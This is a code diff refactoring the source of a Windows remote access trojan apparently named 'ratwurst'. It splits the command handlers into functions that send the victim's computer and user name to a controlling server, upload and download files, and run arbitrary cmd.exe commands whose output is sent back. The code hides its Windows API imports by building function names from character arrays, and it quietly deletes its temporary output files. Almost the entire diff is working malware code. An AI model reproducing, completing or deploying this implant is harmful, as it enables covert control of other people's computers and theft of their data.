@@ -5,29 +5,14 @@
 #include <string.h>
 #include <time.h>
 
-typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
-typedef int WSAAPI _connect(SOCKET s, const sockaddr *name, int namelen);
-typedef int WSAAPI _send(SOCKET s, const char *buf, int len, int flags);
-typedef int WSAAPI _closesocket(SOCKET s);
-typedef u_short _htons(u_short hostshort);
-typedef unsigned long WSAAPI _inet_addr(const char *cp);
-typedef int WSAAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
-typedef int _WSACleanup();
-typedef int WSAAPI _WSAGetLastError();
-typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
-typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
-typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
-typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
-typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
-typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
-typedef HANDLE _CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
-typedef DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
-typedef BOOL _CloseHandle(HANDLE hObject);
+#include "ratwurst.h"
+#include "tools.cpp"
 
-#define SOCKET_BUFFER_SIZE 256
-#define SPLIT_STRING_ARRAY_SIZE 16
-#define FILE_SIZE_DIGIT_SIZE 8
-#define UNLEN 256
+#define global static
+
+global HMODULE g_libraryKernel32;
+global _recv* g_f_recv;
+global _CreateFileA* g_f_CreateFileA;
 
 struct RATSocket
 {
@@ -50,7 +35,115 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSiz
 	return 0;
 }
 
-int SocketUploadFile(RATSocket* ratSocket, char* filePath)
+int FetchInfo(RATSocket* ratSocket)
+{
+	char bufferError[SOCKET_BUFFER_SIZE];
+	char bufferUser[UNLEN + 1];
+	DWORD len = sizeof(bufferUser);
+
+	char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
+	char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
+	len = sizeof(bufferComputer);
+			
+	char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
+	_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(g_libraryKernel32, ca_GetComputerNameA);
+			
+	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
+	{
+		sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
+		OutputDebugStringA(bufferError);
+
+		strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
+	}
+
+	char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
+	HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
+	if ( !libraryAdvapi32 )
+	{
+		OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
+		return 1;
+	}
+			
+	char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
+	_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);
+
+	if ( f_GetUserNameA(bufferUser, &len) <= 0 )
+	{
+		sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
+		OutputDebugStringA(bufferError);
+
+		strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
+	}
+
+	char bufferInfo[SOCKET_BUFFER_SIZE];
+	sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
+	SocketSend(ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
+
+	return 0;
+}
+
+int DownloadFile(RATSocket* ratSocket, char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
+{
+	char* totalReceivedData = NULL;
+	int totalBytesRead = 0;
+			
+	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
+	if ( g_f_recv(ratSocket->socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
+	{
+		int fileSize = atoi(fileSizeBuffer);
+
+		totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
+				
+		for (;;)
+		{
+			char writeBuffer[SOCKET_BUFFER_SIZE] = {};
+			int bytesRead = g_f_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
+			if ( bytesRead != SOCKET_ERROR )
+			{
+				OutputDebugStringA(writeBuffer);
+
+				strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);
+
+				totalBytesRead += bytesRead;
+				if ( totalBytesRead >= fileSize )
+				{
+					break;
+				}
+			}
+			else
+			{
+				OutputDebugStringA("[ERROR] Error receiving download command from server.");
+			}
+		}
+	}
+	else
+	{
+		OutputDebugStringA("[ERROR] Error getting file size.");
+	}
+
+	OutputDebugStringA(totalReceivedData);
+
+	HANDLE fileHandle = g_f_CreateFileA(splittedCommand[1], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if ( fileHandle == INVALID_HANDLE_VALUE )
+	{
+		OutputDebugStringA("Error");
+	}
+
+	DWORD bytesWritten;
+	WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);
+
+	char buffer[256];
+	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
+	OutputDebugStringA(buffer);
+	
+	CloseHandle(fileHandle);
+			
+	free(totalReceivedData);
+
+	return 0;
+}
+
+int UploadFile(RATSocket* ratSocket, char* filePath)
 {
 	FILE* fs;
 	errno_t errorNo = fopen_s(&fs, filePath, "rb");
@@ -83,34 +176,78 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 	}
 }
 
-int SplitString(char* str, char* dest[SPLIT_STRING_ARRAY_SIZE], char* seps)
+int ReceiveCmdCommand(RATSocket* ratSocket, char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
 {
-	int index = 0;
-	
-	char *token = NULL;
-	char *nextToken = NULL;
-	
-	token = strtok_s(str, seps, &nextToken);
-	while( token != NULL )
-	{
-		OutputDebugStringA(token);
-		OutputDebugStringA("\n");
+	PROCESS_INFORMATION pi;
+	STARTUPINFO si = { };
+	si.cb = sizeof(si);
 
-		dest[index++] = token;
-		
-		token = strtok_s(NULL, seps, &nextToken);
-	}
-	return index;
-}
+	char cmdPath[MAX_PATH+8];
 
-void GenerateRandomString(char* destination, unsigned int length)
-{
-	char choices[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0 };
-	size_t choicesLength = strlen(choices);
-	for ( unsigned int i = 0 ; i < length ; i++ )
+	char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
+	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(g_libraryKernel32, ca_GetSystemDirectoryA);
+	f_GetSystemDirectoryA(cmdPath, MAX_PATH);
+
+	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
+	strncat_s(cmdPath, ca_cmdexe, 8);
+
+	char tempPath[MAX_PATH];
+
+	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(g_libraryKernel32, ca_GetTempPathA);
+	f_GetTempPathA(MAX_PATH, tempPath);
+
+	char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };
+
+	int commandIndex = 1;
+	while ( splittedCommand[commandIndex] != NULL )
 	{
-		*destination++ = choices[rand() % choicesLength];
+		strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
+		strncat_s(cmdArg, " ", 1);
+		commandIndex++;
 	}
+
+	char randomFileName[11] = {};
+	GenerateRandomString(randomFileName, 6);
+	strncat_s(randomFileName, ".tmp", 4);
+
+	char filePath[MAX_PATH];
+	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
+	strncat_s(filePath, randomFileName, 10);
+
+	strncat_s(cmdArg, " > ", 3);
+	strncat_s(cmdArg, filePath, strlen(tempPath) + 10);
+
+	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
+	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(g_libraryKernel32, ca_CreateProcessA);
+	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
+	{
+		char bufferError[256];
+		sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
+		OutputDebugStringA(bufferError);
+	}
+
+	char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+	_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(g_libraryKernel32, ca_WaitForSingleObject);
+	f_WaitForSingleObject( pi.hProcess, INFINITE );
+
+	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
+	_CloseHandle* f_CloseHandle = (_CloseHandle*)GetProcAddress(g_libraryKernel32, ca_CloseHandle);
+	f_CloseHandle(pi.hProcess);
+	f_CloseHandle(pi.hThread);
+
+	UploadFile(ratSocket, filePath);
+
+	// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
+	HANDLE handle = g_f_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+	if ( handle == INVALID_HANDLE_VALUE )
+	{
+		OutputDebugStringA("Error deleting file at");
+		OutputDebugStringA(filePath);
+	}
+	f_CloseHandle(handle);
+
+	return 0;
 }
 
 int CALLBACK
@@ -206,23 +343,24 @@ WinMain(HINSTANCE hInstance,
 	SocketSend(&ratSocket, "login", 5);
 
 	char ca_recv[] = { 'r','e','c','v', 0 };
-	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
+	g_f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
-	HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
-	if ( !libraryKernel32 )
+
+	g_libraryKernel32 = LoadLibraryA(ca_kernel32);
+	if ( !g_libraryKernel32 )
 	{
-		OutputDebugStringA("Loading libraryKernel32 failed.\n");
+		OutputDebugStringA("Loading g_libraryKernel32 failed.\n");
 		return 1;
 	}
 
 	char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
-	_CreateFileA* f_CreateFileA = (_CreateFileA*)GetProcAddress(libraryKernel32, ca_CreateFileA);
+	g_f_CreateFileA = (_CreateFileA*)GetProcAddress(g_libraryKernel32, ca_CreateFileA);
 	
 	for(;;)
 	{
 		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
-		if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+		if ( g_f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
 		{
 			OutputDebugStringA("Error receiving message.");
 		}
@@ -239,184 +377,19 @@ WinMain(HINSTANCE hInstance,
 		
 		if ( strcmp(splittedCommand[0], ca_info) == 0 )
 		{
-			char bufferError[SOCKET_BUFFER_SIZE];
-			char bufferUser[UNLEN + 1];
-			DWORD len = sizeof(bufferUser);
-
-			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
-			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
-			len = sizeof(bufferComputer);
-			
-			char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
-			_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(libraryKernel32, ca_GetComputerNameA);
-			
-			if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
-			{
-				sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
-				OutputDebugStringA(bufferError);
-
-				strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
-			}
-
-			char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
-			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
-			if ( !libraryAdvapi32 )
-			{
-				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
-				return 1;
-			}
-			
-			char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
-			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);
-
-			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
-			{
-				sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
-				OutputDebugStringA(bufferError);
-
-				strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
-			}
-
-			char bufferInfo[SOCKET_BUFFER_SIZE];
-			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
-			SocketSend(&ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
+			FetchInfo(&ratSocket);
 		}
 		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
 		{
-			SocketUploadFile(&ratSocket, splittedCommand[1]);
+			UploadFile(&ratSocket, splittedCommand[1]);
 		}
 		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
 		{
-			char* totalReceivedData = NULL;
-			int totalBytesRead = 0;
-			
-			char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
-			if ( f_recv(ratSocket.socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
-			{
-				int fileSize = atoi(fileSizeBuffer);
-
-				totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
-				
-				for (;;)
-				{
-					char writeBuffer[SOCKET_BUFFER_SIZE] = {};
-					int bytesRead = f_recv(ratSocket.socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
-					if ( bytesRead != SOCKET_ERROR )
-					{
-						OutputDebugStringA("## Received download: ");
-						OutputDebugStringA(writeBuffer);
-
-						strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);
-
-						totalBytesRead += bytesRead;
-						if ( totalBytesRead >= fileSize )
-						{
-							OutputDebugStringA("## Breaking");
-							break;
-						}
-					}
-					else
-					{
-						OutputDebugStringA("[ERROR] Error receiving download command from server.");
-					}
-			    
-				}
-				OutputDebugStringA("### DONE DOWNLOADING");
-			}
-			else
-			{
-				OutputDebugStringA("[ERROR] Error getting file size.");
-			}
-
-			OutputDebugStringA(totalReceivedData);
-
-			HANDLE fileHandle = CreateFileA(splittedCommand[1], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if ( fileHandle == INVALID_HANDLE_VALUE )
-			{
-				OutputDebugStringA("Error");
-			}
-
-			DWORD bytesWritten;
-			WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);
-
-			char buffer[256];
-			sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
-			OutputDebugStringA(buffer);
-	
-			CloseHandle(fileHandle);
-			
-			free(totalReceivedData);
+			DownloadFile(&ratSocket, splittedCommand);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
-			PROCESS_INFORMATION pi;
-			STARTUPINFO si = { };
-			si.cb = sizeof(si);
-
-			char cmdPath[MAX_PATH+8];
-
-			char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
-			_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(libraryKernel32, ca_GetSystemDirectoryA);
-			f_GetSystemDirectoryA(cmdPath, MAX_PATH);
-
-			char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
-			strncat_s(cmdPath, ca_cmdexe, 8);
-
-			char tempPath[MAX_PATH];
-
-			char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
-			_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(libraryKernel32, ca_GetTempPathA);
-			f_GetTempPathA(MAX_PATH, tempPath);
-
-			char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };
-
-			int commandIndex = 1;
-			while ( splittedCommand[commandIndex] != NULL )
-			{
-				strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
-				strncat_s(cmdArg, " ", 1);
-				commandIndex++;
-			}
-
-			char randomFileName[11] = {};
-			GenerateRandomString(randomFileName, 6);
-			strncat_s(randomFileName, ".tmp", 4);
-
-			char filePath[MAX_PATH];
-			strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
-			strncat_s(filePath, randomFileName, 10);
-
-			strncat_s(cmdArg, " > ", 3);
-			strncat_s(cmdArg, filePath, strlen(tempPath) + 10);
-
-			char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
-			_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(libraryKernel32, ca_CreateProcessA);
-			if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
-			{
-				char bufferError[256];
-				sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
-				OutputDebugStringA(bufferError);
-			}
-
-			char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
-			_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(libraryKernel32, ca_WaitForSingleObject);
-			f_WaitForSingleObject( pi.hProcess, INFINITE );
-
-			char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
-			_CloseHandle* f_CloseHandle = (_CloseHandle*)GetProcAddress(libraryKernel32, ca_CloseHandle);
-			f_CloseHandle(pi.hProcess);
-			f_CloseHandle(pi.hThread);
-
-			SocketUploadFile(&ratSocket, filePath);
-
-			// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
-			HANDLE handle = f_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
-			if ( handle == INVALID_HANDLE_VALUE )
-			{
-				OutputDebugStringA("Error deleting file at");
-				OutputDebugStringA(filePath);
-			}
-			f_CloseHandle(handle);
+			ReceiveCmdCommand(&ratSocket, splittedCommand);
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
